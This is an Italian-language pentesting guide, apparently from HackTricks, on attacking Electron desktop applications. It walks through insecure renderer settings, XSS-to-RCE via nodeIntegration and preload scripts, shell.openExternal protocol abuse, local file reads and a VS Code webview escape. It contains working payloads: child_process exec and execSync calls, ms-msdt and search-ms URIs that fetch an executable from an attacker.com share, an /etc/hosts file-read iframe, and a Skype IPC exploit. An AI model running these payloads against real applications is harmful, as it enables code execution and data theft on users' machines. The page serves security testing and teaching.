# App desktop Electron

{{#include ../../banners/hacktricks-training.md}}

## Introduzione

Electron combina un processo principale **Node.js** privilegiato con processi renderer **Chromium**. Electron non è un browser web: il codice dell’applicazione può esporre deliberatamente funzionalità come l’accesso al filesystem e alla shell, quindi il caricamento di contenuti non attendibili richiede una progettazione dei confini più rigorosa rispetto a un normale sito web.<sup>[[21]](#references)</sup>

Il codice delle applicazioni Electron è comunemente incluso in un archivio `.asar`. Estrailo prima di esaminare il codice sorgente:

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

Il `package.json` dell'applicazione identifica il suo punto di ingresso principale. Quel file crea comunemente finestre del renderer e imposta le relative `webPreferences`, sensibili alla sicurezza.

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron ha due tipi principali di processi:

- Main Process (ha accesso completo a NodeJS)
- Renderer Process (dovrebbe avere accesso limitato a NodeJS per motivi di sicurezza)

![App desktop Electron - Introduzione: Renderer Process (dovrebbe avere accesso limitato a NodeJS per motivi di sicurezza)](<../../images/image (182).png>)

Un **renderer process** sarà una finestra del browser che carica un file:<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

Il **main process** configura ciascun processo renderer, comunemente durante la creazione di un `BrowserWindow`. Impostazioni sicure riducono la possibilità che la compromissione del renderer si trasformi in esecuzione di codice nativo, ma non rendono intrinsecamente sicuri i contenuti non attendibili.<sup>[[21]](#references)[[22]](#references)</sup>

Esamina almeno queste preferenze del renderer:<sup>[[22]](#references)</sup>

- **`nodeIntegration`** è `false` per impostazione predefinita. Abilitandolo, il JavaScript del renderer ottiene accesso alle API di Node.js e viene disabilitato anche il sandbox di quel renderer.
- **`contextIsolation`** è `true` per impostazione predefinita. Separa il contesto JavaScript della pagina da quello usato dagli script preload e dai componenti interni di Electron.
- **`preload`** non ha un percorso predefinito. Uno script preload configurato viene eseguito prima degli script della pagina e può esporre API con ambito limitato tramite `contextBridge`.
- **`sandbox`** è `true` per impostazione predefinita da Electron 20. Limita l'accesso del renderer alle risorse del sistema operativo; impostando `nodeIntegration: true` viene disabilitato.
- **`nodeIntegrationInWorker`** è `false` per impostazione predefinita e controlla l'integrazione di Node.js nei Web Worker.
- **`nodeIntegrationInSubFrames`** è `false` per impostazione predefinita.
  - Se **`nodeIntegration`** è **abilitato**, ciò consente di usare le **API di Node.js** nelle pagine web **caricate negli iframe** all'interno di un'applicazione Electron.
  - Se **`nodeIntegration`** è **disabilitato**, i preload verranno caricati nell'iframe.

Esempio di configurazione:

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

Alcuni **RCE payloads** da [qui](https://7as.es/electron/nodeIntegration_rce.txt):<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### Cattura del traffico

Modifica la configurazione di start-main e aggiungi l'uso di un proxy come:

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## Tracciamento statico dei confini da ASAR al codice nativo con REA

**REA** può leggere un ASAR o una directory dell'applicazione estratta senza eseguire il bootstrap JavaScript. Il grafo dell'applicazione registra i punti di ingresso dei package, i moduli inclusi, le impostazioni di `BrowserWindow` e preload, i membri di `contextBridge`, le registrazioni IPC, le richieste di add-on nativi e le identità delle source map. Questo fornisce un punto di partenza per tracciare una funzionalità esposta al renderer fino a un handler privilegiato del processo principale.<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

Per una stringa di feature letterale, passa il record Evidence completo come `application` e sostituisci il seed con uno osservato nel target:<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

Lo stesso workflow `trace_application_feature` accetta anche come seed un membro API letterale osservato, un canale IPC o un modulo. Verifica il percorso dell'handler risultante, i possibili punti di validazione e il passaggio al codice nativo confrontandoli con le posizioni del codice sorgente restituite. Un `invoke` del renderer corrisponde a un solo candidato univoco `ipcMain.handle`/`handleOnce` sullo stesso canale letterale esatto; analogamente, `send` richiede un solo candidato univoco `ipcMain.on`/`once`/`addListener`. Gli handler dinamici o duplicati restano irrisolti. Un membro `.node` richiesto non è un export nativo verificato; per giungere a tale conclusione, l'evidenza di Hopper/Ghidra deve avere lo stesso digest dell'artefatto. La raggiungibilità statica, inoltre, non dimostra che il percorso sia stato eseguito.<sup>[[24]](#references)[[25]](#references)</sup>

Per il confine di fiducia tra renderer e main e la validazione degli handler, consulta [RCE tramite IPC con contextIsolation in Electron](electron-contextisolation-rce-via-ipc.md).

Per un'analisi nativa successiva basata sul provider, consulta [Strumenti e metodi di base per il reverse engineering](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea).

## Superficie di attacco dell'aggiornamento automatico di Electron

Per l'integrità dei feed di rilascio, il rollback, la confusione dei canali firmati e le condizioni TOCTOU dei file di staging, consulta [Confini di fiducia dell'aggiornamento automatico di Electron](electron-auto-update-trust-boundaries.md).

## Iniezione di codice locale in Electron

Se disponi dell'accesso locale in scrittura o di strumentazione a un'app installata, consulta [Iniezione di codice locale e manomissione degli snapshot in Electron](electron-local-code-injection-and-snapshot-tampering.md) per i percorsi ASAR/processo main e snapshot V8, oltre ai link specifici per sistema operativo.

## RCE: XSS + nodeIntegration

Se **nodeIntegration** è impostato su **on**, il JavaScript di una pagina web può usare facilmente le funzionalità di Node.js semplicemente chiamando `require()`. Per esempio, il modo per eseguire l'applicazione calc su Windows è:

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Lo script indicato in questa impostazione viene **caricato prima degli altri script nel renderer**, quindi ha **accesso illimitato alle API Node**:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

Pertanto, lo script può esportare node-features nelle pagine:

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **Se `contextIsolation` è attivo, non funzionerà**

## RCE: XSS + contextIsolation

_**contextIsolation**_ introduce **contesti separati tra gli script della pagina web e il codice JavaScript interno di Electron**, in modo che l'esecuzione JavaScript di ciascun codice non influisca sull'altro. È una funzionalità necessaria per eliminare la possibilità di RCE.

Se i contesti non sono isolati, un attacker può:

1. Eseguire **JavaScript arbitrario nel renderer** (XSS o navigazione verso siti esterni)
2. **Sovrascrivere il metodo built-in** usato nel codice preload o nel codice interno di Electron, assegnandogli una funzione propria
3. **Attivare** l'uso della **funzione sovrascritta**
4. RCE?

Ci sono 2 punti in cui è possibile sovrascrivere i metodi built-in: nel codice preload o nel codice interno di Electron:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Bypass dell'evento click

Se sono applicate restrizioni quando fai clic su un link, potresti riuscire ad aggirarle **facendo clic con il tasto centrale** invece che con il normale tasto sinistro.

```javascript
window.addEventListener('click', (e) => {
```

## RCE tramite shell.openExternal

Per ulteriori informazioni su questi esempi, consulta [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) e [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>

Quando si distribuisce un'applicazione desktop Electron, è fondamentale assicurarsi che le impostazioni di `nodeIntegration` e `contextIsolation` siano corrette. È stato stabilito che, con queste impostazioni attive, l'esecuzione di codice remoto (RCE) lato client, diretta agli script preload o al codice nativo di Electron dal processo principale, viene di fatto impedita.

Quando un utente interagisce con i link o apre nuove finestre, vengono attivati specifici event listener, fondamentali per la sicurezza e il funzionamento dell'applicazione:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

Questi listener vengono **sovrascritti dall'applicazione desktop** per implementare la propria **logica aziendale**. L'applicazione valuta se un link visitato debba essere aperto internamente o in un browser web esterno. Questa decisione viene in genere presa tramite una funzione, `openInternally`. Se questa funzione restituisce `false`, significa che il link deve essere aperto esternamente, utilizzando la funzione `shell.openExternal`.

**Ecco uno pseudocodice semplificato:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Le best practice di sicurezza di Electron sconsigliano di accettare contenuti non attendibili con la funzione `openExternal`, poiché ciò potrebbe causare RCE attraverso vari protocolli. I sistemi operativi supportano diversi protocolli che potrebbero innescare RCE. Per esempi dettagliati e ulteriori spiegazioni su questo argomento, è possibile consultare [questa risorsa](https://positive.security/blog/url-open-rce#windows-10-19042), che include esempi di protocolli Windows in grado di sfruttare questa vulnerabilità.<sup>[[10]](#references)</sup>

In macOS, la funzione `openExternal` può essere sfruttata per eseguire comandi arbitrari, ad esempio con `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Esempi di exploit dei protocolli Windows includono:**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Questa vulnerabilità è descritta in **[questo report](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.<sup>[[11]](#references)</sup>

**webviewTag** è una **funzionalità deprecata** che consente di usare **NodeJS** nel **processo renderer**. Dovrebbe essere disabilitata, poiché consente di caricare uno script nel contesto preload, ad esempio:

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

Pertanto, un attacker in grado di caricare una pagina arbitraria poteva usare quel tag per **caricare uno script preload arbitrario**.

Questo script preload è stato poi sfruttato per chiamare un **servizio IPC vulnerabile (`skype-new-window`)**, che chiamava **`shell.openExternal`** per ottenere RCE:

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## Lettura di file interni: XSS + contextIsolation

**Disabilitare `contextIsolation` consente di usare i tag `<webview>`**, simili a `<iframe>`, per leggere ed esfiltrare file locali. Un esempio mostra come sfruttare questa vulnerabilità per leggere il contenuto di file interni:<sup>[[2]](#references)</sup>

![RCE: webviewTag + preload IPC vulnerabile + shell.openExternal - Lettura di file interni: XSS + contextIsolation: Disabilitare contextIsolation consente di usare i tag , simili a , per...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Inoltre, viene illustrato un altro metodo per **leggere un file interno**, mettendo in evidenza una vulnerabilità critica di lettura di file locali in un'app desktop Electron. Il metodo consiste nell'iniettare uno script per sfruttare l'applicazione ed esfiltrare i dati:

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + Chromium obsoleto**

Se la versione di **Chromium** inclusa nell'applicazione è obsoleta e presenta vulnerabilità note, potrebbe essere possibile sfruttarle e trasformare XSS in RCE.<sup>[[20]](#references)</sup>\
Puoi vedere un esempio in questo **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **Phishing tramite XSS con bypass della regex degli URL interni**

Se trovi XSS ma **non riesci a provocare RCE o a rubare file interni**, potresti comunque provare a **rubare credenziali tramite phishing**.<sup>[[1]](#references)</sup>

Per prima cosa, esamina il codice frontend per determinare cosa succede quando viene aperto un nuovo URL:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

La chiamata a **`openInternally`** determina se un link della piattaforma si apre nella **finestra desktop** oppure se una risorsa di terze parti si apre nel browser di sistema.

Se è possibile aggirare la regex dell'allowlist degli URL della funzione, ad esempio perché i punti nel nome host non sono stati sottoposti a escape, un attaccante potrebbe sfruttare una XSS per aprire una richiesta di credenziali convincente su un'infrastruttura controllata dall'attaccante:

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## Protocollo `file://`

Come indicato nella [guida alla sicurezza di Electron](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), le pagine in esecuzione su **`file://`** hanno ampio accesso ai file. Di conseguenza, **XSS può consentire di caricare file arbitrari** dal computer dell'utente. Un **custom protocol** progettato correttamente può limitare l'accesso a un insieme specifico di file.<sup>[[21]](#references)</sup>

Per un bypass distinto dell'ambito dei file nel contesto worker delle anteprime degli assistenti desktop, vedi [AI assistant embedded browser trust boundaries](../../AI/AI-Embedded-Browser-Trust-Boundaries.md#worker-context-bypass-of-a-local-previews-file-scope).

## Modulo Remote

Il modulo Remote di Electron consente ai **processi renderer di accedere alle API del processo main**, facilitando la comunicazione all'interno di un'applicazione Electron. Tuttavia, l'attivazione di questo modulo comporta rischi significativi per la sicurezza. Amplia la superficie di attacco dell'applicazione, rendendola più esposta a vulnerabilità come gli attacchi cross-site scripting (XSS).

> [!TIP]
> Sebbene il modulo **remote** esponga alcune API dai processi main ai processi renderer, non è semplice ottenere RCE abusando soltanto dei componenti. Tuttavia, i componenti potrebbero esporre informazioni sensibili.

> [!WARNING]
> Molte app che utilizzano ancora il modulo remote lo fanno in modo da **richiedere che NodeIntegration sia attivato** nel processo renderer, con un **enorme rischio per la sicurezza**.

Il modulo `remote` integrato in Electron è stato deprecato e poi rimosso; le applicazioni che necessitano ancora di questo modello possono usare il pacchetto separato `@electron/remote`. Considerate le implicazioni per la sicurezza e le prestazioni, evita di esporre capacità in stile remote a renderer non attendibili.

Con `@electron/remote`, è necessario prima **inizializzarlo nel processo main**:

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

Il processo renderer può quindi importare oggetti dal modulo:

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

Il **[post del blog](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** indica alcune **funzioni** interessanti esposte dall’oggetto **`app`** del modulo remote:<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - **Riavvia** l’applicazione **uscendo** dall’istanza corrente e **avviandone** una nuova. Utile per gli **aggiornamenti dell’app** o cambiamenti significativi dello **stato**.
- **`app.setAppLogsPath([path])`**  
   - **Definisce** o **crea** una directory in cui archiviare i **log dell’app**. I log possono essere **recuperati** o **modificati** usando **`app.getPath()`** o **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - **Registra** l’eseguibile corrente come **gestore predefinito** di un **protocollo** specificato. Se necessario, è possibile fornire un **percorso personalizzato** e degli **argomenti**.
- **`app.setUserTasks(tasks)`**  
   - **Aggiunge** attività alla categoria **Tasks** nella **Jump List** (su Windows). Ogni attività può controllare come viene **avviata** l’app o quali **argomenti** vengono passati.
- **`app.importCertificate(options, callback)`**  
   - **Importa** un **certificato PKCS#12** nell’**archivio dei certificati** di sistema (solo Linux). È possibile usare una **callback** per gestire il risultato.
- **`app.moveToApplicationsFolder([options])`**  
   - **Sposta** l’applicazione nella **cartella Applications** (su macOS). Aiuta a garantire un’**installazione standard** per gli utenti Mac.
- **`app.setJumpList(categories)`**  
   - **Imposta** o **rimuove** una **Jump List personalizzata** su **Windows**. È possibile specificare le **categorie** per organizzare la visualizzazione delle attività.
- **`app.setLoginItemSettings(settings)`**  
   - **Configura** quali **eseguibili** vengono avviati all’**accesso**, insieme alle relative **opzioni** (solo macOS e Windows).
  
Esempio:

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## modulo systemPreferences

L'**API principale** per accedere alle preferenze di sistema e **generare eventi di sistema** in Electron. Metodi come **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** e **setUserDefault** fanno tutti **parte di** questo modulo.

**Esempio di utilizzo:**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **Ascolta** le **notifiche native di macOS** usando NSDistributedNotificationCenter.  
* Prima di **macOS Catalina**, era possibile sniffare **tutte** le notifiche distribuite passando **nil** a CFNotificationCenterAddObserver.  
* Dopo **Catalina / Big Sur**, le app sandboxed possono ancora **sottoscriversi** a **molti eventi** (ad esempio, **blocchi/sblocchi dello schermo**, **montaggi di volumi**, **attività di rete**, ecc.) registrando le notifiche **per nome**.

### **getUserDefault / setUserDefault**

* Si **interfaccia** con **NSUserDefaults**, che memorizza le preferenze **dell'applicazione** o **globali** su macOS.
    
* **getUserDefault** può **recuperare** informazioni sensibili, come le **posizioni recenti dei file** o la **posizione geografica dell'utente**.
    
* **setUserDefault** può **modificare** queste preferenze, influendo potenzialmente sulla **configurazione** di un'app.
    
* Nelle **versioni precedenti di Electron** (prima della v8.3.0), era **accessibile** solo la **suite standard** di NSUserDefaults.

## Shell.showItemInFolder

Questa funzione mostra il file indicato in un file manager. Nelle piattaforme e versioni interessate, questa interazione **poteva eseguire automaticamente il file**.

Per ulteriori informazioni, consulta [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## Content Security Policy

Le app Electron dovrebbero avere una **Content Security Policy (CSP)** per **prevenire gli attacchi XSS**. La **CSP** è uno **standard di sicurezza** che aiuta a **prevenire** l'**esecuzione** di **codice non attendibile** nel browser.

Di solito viene **configurata** nel file **`main.js`** o nel template **`index.html`**, inserendo la CSP in un **meta tag**.

Per ulteriori informazioni, consulta:


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE: Webview CSP + postMessage trust + local file loading (VS Code 1.63)

Questa catena reale ha interessato Visual Studio Code 1.63 (CVE-2021-43908) e mostra come una singola XSS in una webview, originata da markdown, possa essere sfruttata per ottenere una RCE completa quando CSP, postMessage e gli handler degli scheme sono configurati in modo errato. PoC pubblica: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

Panoramica della catena di attacco
- Prima XSS tramite CSP della webview: la CSP generata includeva `style-src 'self' 'unsafe-inline'`, consentendo l'iniezione basata su inline/style in un contesto `vscode-webview://`. Il payload inviava un beacon a `/stealID` per esfiltrare l'extensionId della webview target.
- Creazione dell'URL della webview target: utilizzo dell'ID trapelato per creare `vscode-webview://<extensionId>/.../<publicUrl>`.
- Seconda XSS tramite fiducia in postMessage: la webview esterna si fidava di `window.postMessage` senza controlli rigorosi su origin e tipo e caricava HTML dell'attaccante con `allowScripts: true`.
- Caricamento di file locali tramite riscrittura di scheme/path: il payload riscriveva `file:///...` in `vscode-file://vscode-app/...` e sostituiva `exploit.md` con `RCE.html`, sfruttando una validazione debole del percorso per caricare una risorsa locale privilegiata.
- RCE in un contesto con Node abilitato: l'HTML caricato veniva eseguito con le API di Node disponibili, consentendo l'esecuzione di comandi del sistema operativo.

Esempio di primitive RCE nel contesto finale
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

Letture correlate sui problemi di trust in postMessage:

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev: shortcut sintetiche nelle webview + bridge dichiarativi per i comandi delle estensioni

Nel giugno 2026 è emersa una diversa classe di escape dalle webview di VS Code: **JavaScript non attendibile all'interno di una webview di notebook/anteprima poteva simulare shortcut globali con privilegi**, perché il preload della webview inoltrava i dati di `keydown` al workbench host, che li gestiva come input dell'utente reale.<sup>[[14]](#references)</sup>

Questo fa parte di una storia più ampia di attacchi ai confini di trust degli IDE, in cui contenuti controllati dal progetto raggiungono funzionalità privilegiate dell'editor.<sup>[[19]](#references)</sup>

### Errore nel confine

Se una webview cross-origin/in sandbox copia campi della tastiera controllati dall'attaccante (`key`, `code`, `keyCode`, modificatori, `repeat`) in un bridge privilegiato `postMessage`/message-port **senza verificare `event.isTrusted`**, JavaScript all'interno della webview può eseguire shortcut del workbench con:<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

Questo è particolarmente utile quando il browser **blocca la digitazione sintetica**. Gli eventi di tasto generati da script di solito **non possono inserire testo arbitrario negli elementi HTML `<input>`**, ma attivano comunque le scorciatoie che gestiscono direttamente `keydown`.

### Schemi di abuso pratici

- **Abuso dell’interfaccia tramite scorciatoie:** puntare a binding globali, come l’accettazione di notifiche, la navigazione nelle palette, l’attivazione di pulsanti selezionati o lo spostamento nei menu, invece di tentare di digitare comandi.
- **Richieste privilegiate prevedibili tramite i metadati del workspace:** un file `.vscode/extensions.json` controllato dal repository può consigliare un’estensione dell’attaccante e generare una notifica d’installazione prevedibile, che può essere accettata con una scorciatoia come `Ctrl+Shift+A`.
- **Manifest dichiarativo dell’estensione come ponte di comandi:** anche se in VS Code per il web CSP blocca il codice delle estensioni locali del workspace, i contributi dichiarativi di `package.json` possono comunque essere caricati. Un’estensione locale in `.vscode/extensions` può registrare un binding di tasti che chiama `runCommands` e poi un comando interno privilegiato come `workbench.extensions.installExtension`.<sup>[[14]](#references)[[18]](#references)</sup>

Schema di esempio del manifest:

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **Flag di sicurezza nascosti raggiungibili tramite metadati non attendibili:** se il comando interno accetta argomenti controllati dall’attaccante, come `{"context":{"skipPublisherTrust":true}}`, i metadati dichiarativi possono sopprimere una finestra di dialogo di trust e installare un’estensione ospitata su Marketplace/CDN che infine esegue codice dell’attaccante.
- **Abuso dei workspace attendibili:** se i workspace remoti/web vengono considerati attendibili automaticamente, le estensioni dei workspace locali diventano un ponte di grande valore tra i contenuti dei repository e le azioni privilegiate dell’editor.
- **Ampliamento dell’ambito dopo la compromissione:** dopo l’esecuzione dell’estensione, verifica quali token l’editor espone alle estensioni. In `github.dev`, il token GitHub sottratto era valido anche al di fuori del repository aperto; di conseguenza, una richiesta a `https://api.github.com/user/repos` elencava altri repository privati accessibili.

### Note di audit

- Considera l’**inoltro di input da webview all’host** un confine di privilegio; non ridistribuire mai eventi sintetici di tastiera/click provenienti da frame non attendibili all’host.
- Applica l’autorizzazione **all’interno** dei comandi sensibili. Non accettare il contesto del comando fornito dal chiamante, che può impostare flag interni come `skipPublisherTrust`.
- Non dare per scontato che bloccare il codice eseguibile delle estensioni locali sia sufficiente; esamina anche i **contributi dichiarativi** (`keybindings`, `menus`, `commands`, task) dei manifest controllati dal workspace.
- Le correzioni del 3 giugno 2026 hanno aggiunto `isTrusted` agli eventi inoltrati, disabilitato l’inoltro di tasti non attendibili nelle webview dei notebook e smesso di accettare il contesto del comando di installazione fornito dal chiamante.<sup>[[16]](#references)[[17]](#references)</sup>

## **Strumenti**

La raccolta curata **awesome-electronjs-hacking** fornisce ulteriori risorse di ricerca, strumenti e applicazioni vulnerabili.<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity) è uno strumento per identificare configurazioni errate e anti-pattern di sicurezza nelle applicazioni basate su Electron.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) è un plugin open source per VS Code dedicato alle applicazioni Electron che utilizza Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) verifica la presenza di librerie di terze parti vulnerabili.
- [**Electro.ng**](https://electro.ng/) è uno strumento commerciale per l’analisi della sicurezza di Electron.

## Laboratori

In [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) trovi un laboratorio per sfruttare applicazioni Electron vulnerabili.<sup>[[4]](#references)</sup>

Questi comandi ti aiutano a svolgere il laboratorio:

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

Indirizzo pubblicato in precedenza per i bookmark esistenti: [app desktop Electron](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Il percorso dell’intera pagina reindirizza qui; il fragment storico non viene mantenuto.

## References

- [1] [Phishing e raccolta di credenziali nelle applicazioni Electron](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Lettura arbitraria di file nell’app desktop di Facebook Messenger](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron: sfruttare la mancanza di context isolation - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [Workshop su come hackerare le app desktop moderne con XSS e RCE](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - una raccolta curata di risorse sull’(in)sicurezza di Electron.js](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Uso improprio delle API di Electron: la prima scelta di un attacker](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Payload RCE per Electron nodeIntegration](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [RCE con un clic nelle applicazioni Electron](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [I pericoli di shell.openExternal() di Electron: molti percorsi verso l’esecuzione di codice remoto](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [Consenti URL arbitrari, aspettati l’esecuzione di codice arbitrario](https://positive.security/blog/url-open-rce#windows-10-19042)
